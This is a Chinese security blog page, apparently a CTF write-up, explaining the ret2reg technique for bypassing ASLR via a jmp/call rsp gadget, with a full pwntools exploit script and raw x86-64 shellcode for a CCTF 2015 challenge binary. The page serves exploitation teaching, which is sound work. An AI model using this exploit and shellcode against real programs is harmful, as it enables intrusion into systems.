@@ -1,0 +1,674 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>使用ret2reg攻击绕过地址混淆 | All Right</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="All Right">
+    
+
+    
+    <meta name="description" content="什么是ret2regret2reg攻击绕过地址混淆，即return-to-register，返回到寄存地址执行 的攻击方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用ret2reg攻击绕过地址混淆">
+<meta property="og:url" content="http://spd.dropsec.xyz/2016/11/02/ret2reg技术/index.html">
+<meta property="og:site_name" content="All Right">
+<meta property="og:description" content="什么是ret2regret2reg攻击绕过地址混淆，即return-to-register，返回到寄存地址执行 的攻击方法。">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161121.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161122.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161123.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161124.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161125.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161126.png">
+<meta property="og:image" content="http://oeiu48wqi.bkt.clouddn.com/20161127.png">
+<meta property="og:updated_time" content="2017-04-07T09:07:11.160Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用ret2reg攻击绕过地址混淆">
+<meta name="twitter:description" content="什么是ret2regret2reg攻击绕过地址混淆，即return-to-register，返回到寄存地址执行 的攻击方法。">
+<meta name="twitter:image" content="http://oeiu48wqi.bkt.clouddn.com/20161121.png">
+<meta name="twitter:creator" content="@https://twitter.com/">
+
+    
+    <link rel="alternative" href="/atom.xml" title="All Right" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="All Right" title="All Right"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="All Right">All Right</a></h1>
+				<h2 class="blog-motto">A binary security Porter</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:spd.dropsec.xyz">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/11/02/ret2reg技术/" title="使用ret2reg攻击绕过地址混淆" itemprop="url">使用ret2reg攻击绕过地址混淆</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="All Right" target="_blank" itemprop="author">All Right</a>
+		
+  <p class="article-time">
+    <time datetime="2016-11-02T10:45:46.000Z" itemprop="datePublished"> 发表于 2016-11-02</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是ret2reg"><span class="toc-number">1.</span> <span class="toc-text">什么是ret2reg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用步骤"><span class="toc-number">2.</span> <span class="toc-text">利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">3.</span> <span class="toc-text">例子</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="什么是ret2reg"><a href="#什么是ret2reg" class="headerlink" title="什么是ret2reg"></a>什么是ret2reg</h3><p>ret2reg攻击绕过地址混淆，即return-to-register，返回到寄存地址执行 的攻击方法。<br><a id="more"></a><br>ret2reg方法核心是：找到寄存器与缓冲区地址的确定性关系，然后从程序中搜索call reg/jmp reg这样的指令；如果两者条件满足，则</p>
+<ol>
+<li>分析和调试汇编，看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
+<li>然后反编译二进制，查找call reg 或者jmp reg指令，将该指令所在的地址注入到 EIP</li>
+<li>再在reg指向的空间上注入Shellcode</li>
+</ol>
+<p>此攻击方法之所以能成功，是因为函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后在的运行过程中不会修改。尽管栈空间具有随机性，但该寄存器的值与缓冲区地址的关系是确定的，在随机地址之上，建立了必然的地址关系。一句话就是 在随机性上找到地址的确定性关系。</p>
+<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol>
+<li>对准EIP<br>第一步首先是对准EIP，我们输入数据引发溢出，覆盖EIP。</li>
+<li>确定哪个寄存器与缓冲区有确定性的关系<br>如果你一步一步地按ret2addr攻击方法操作并攻击成功，那么你会发现此时的esp就是指向注入EIP的下一个地址。如果你能在程序中找到call esp或者jmp esp(64位的为rsp)这样的指令，就可以将EIP注入该指令地址，并且在EIP后面注入shellcode，那就彻底绕过地址混淆保护方法。</li>
+</ol>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这是一道cctf2015的一道题，我们用IDA打开后直接查看伪代码。</p>
+<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161121.png" alt=""></p>
+<p>从上面的伪代码我们可以看出，我们输入的数据全部拷贝到了V6。接下来我们在gdb下调试这个ELF文件。</p>
+<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161122.png" alt=""></p>
+<p>查看保护<br><img src="http://oeiu48wqi.bkt.clouddn.com/20161123.png" alt=""></p>
+<p>checksec可以看到程序没有没有打开任何保护措施,现在唯一需要解决的就是系统自带的ASLR,(注意,使用gdb调试时,每次看到的栈地址可能是不变的,这并不代表系统没有打开ASLR,gdb调试时会自动关闭ASLR)<br>我们首先输入40个测试字符A进行测试，发现没有发生溢出。</p>
+<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161124.png" alt=""><br>接下来我们输入80个A发现出现了溢出。</p>
+<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161125.png" alt=""></p>
+<p>可以看出从第四十个字节开始的八个字节就会覆盖返回地址<br>然后我们还需要一个跳板作为返回地址 。使用jmpcall rsp。rsp是栈指针寄存器，64位。指向栈顶。相当于32位汇编里的esp，16位的sp。<br><img src="http://oeiu48wqi.bkt.clouddn.com/20161126.png" alt=""><br>我们就采用第一个地址。<br>最后我们需要一个shellcode,这可以通过msf生成，也可以在exploit.db上下载。</p>
+<p>exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#!/user/bin/python</div><div class="line">from pwn import *</div><div class="line">p = process(&apos;./cctf2015_pwn1&apos;)</div><div class="line">p.recvuntil(&apos;overflow!&apos;)</div><div class="line"></div><div class="line">pad = &apos;a&apos;*40</div><div class="line">jmpAddr=&apos;\x7d\x68\x43\x00\x00\x00\x00\x00&apos;</div><div class="line">shellcode = &quot;&quot;</div><div class="line">shellcode+=&quot;\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05&quot;</div><div class="line">shellcode+=&quot;\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd&quot;</div><div class="line">shellcode+=&quot;\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;</div><div class="line">shellcode+=&quot;\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d&quot;</div><div class="line">shellcode+=&quot;\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53&quot;</div><div class="line">shellcode+=&quot;\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95&quot;</div><div class="line">shellcode+=&quot;\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44&quot;</div><div class="line">p.sendline(pad + jmpAddr + shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>成功拿到shell<br><img src="http://oeiu48wqi.bkt.clouddn.com/20161127.png" alt=""></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/漏洞分析/">漏洞分析</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Ret2reg/">Ret2reg</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://spd.dropsec.xyz/2016/11/02/ret2reg技术/" data-title="使用ret2reg攻击绕过地址混淆 | All Right" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/11/06/mmap-函数/" title="mmap()函数">
+  <strong>上一篇：</strong><br/>
+  <span>
+  mmap()函数</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2016/10/29/《格蠹汇编软件调试案例集锦》之拯救发疯的Windows7/"  title="《格蠹汇编软件调试案例集锦》之拯救发疯的Windows7">
+ <strong>下一篇：</strong><br/> 
+ <span>《格蠹汇编软件调试案例集锦》之拯救发疯的Windows7
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2016/11/02/ret2reg技术/" data-title="使用ret2reg攻击绕过地址混淆" data-url="http://spd.dropsec.xyz/2016/11/02/ret2reg技术/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是ret2reg"><span class="toc-number">1.</span> <span class="toc-text">什么是ret2reg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用步骤"><span class="toc-number">2.</span> <span class="toc-text">利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">3.</span> <span class="toc-text">例子</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github 名片</p>
+<div class="github-card" data-github="myGoodLuck" data-width="220" data-height="119" data-theme="medium">
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+  </div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Android/" title="Android">Android<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/安全工具/" title="安全工具">安全工具<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞分析/" title="漏洞分析">漏洞分析<sup>14</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程技术/" title="编程技术">编程技术<sup>18</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/逆向破解/" title="逆向破解">逆向破解<sup>12</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Windows/" title="Windows">Windows<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Python/" title="Python">Python<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安全工具开发/" title="安全工具开发">安全工具开发<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C-C/" title="C/C++">C/C++<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ROP/" title="ROP">ROP<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Android逆向/" title="Android逆向">Android逆向<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Ret2reg/" title="Ret2reg">Ret2reg<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Stack-smashing-Protection/" title="Stack-smashing-Protection">Stack-smashing-Protection<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/竞争条件漏洞/" title="竞争条件漏洞">竞争条件漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/密码学/" title="密码学">密码学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IDA/" title="IDA">IDA<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/免杀/" title="免杀">免杀<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/X86汇编/" title="X86汇编">X86汇编<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Android-Hook/" title="Android Hook">Android Hook<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/符号执行/" title="符号执行">符号执行<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://bbs.pediy.com/" target="_blank" title="看雪论坛">看雪论坛</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.52pojie.cn/" target="_blank" title="吾爱破解">吾爱破解</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.freebuf.com/" target="_blank" title="Freebuf">Freebuf</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bobao.360.cn/" target="_blank" title="安全客">安全客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wobushi.cn/" target="_blank" title="Vam博客">Vam博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.sec-wiki.com/index.php" target="_blank" title="SecWiki">SecWiki</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://jaq.alibaba.com/community/index" target="_blank" title="阿里聚安全">阿里聚安全</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.droidsec.cn/" target="_blank" title="Android安全中文站">Android安全中文站</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.dropsec.xyz" target="_blank" title="Drops团队主页">Drops团队主页</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://139.129.36.207:8080/" target="_blank" title="Drops攻防平台">Drops攻防平台</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=null&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m All Right. <br/>
+			I like reverse cracking and vulnerability mining.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/u/3935817858?refer_flag=1001030102_&amp;is_all=1" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/myGoodLuck" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		<a href="https://twitter.com/https://twitter.com/" target="_blank" class="icon-twitter" title="twitter"></a>
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:spd1234@foxmail.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a>  © 2017 
+		
+		<a href="/about" target="_blank" title="All Right">All Right</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"hexo-next"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?19fc2bc0462099cb39127e61934055ec";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
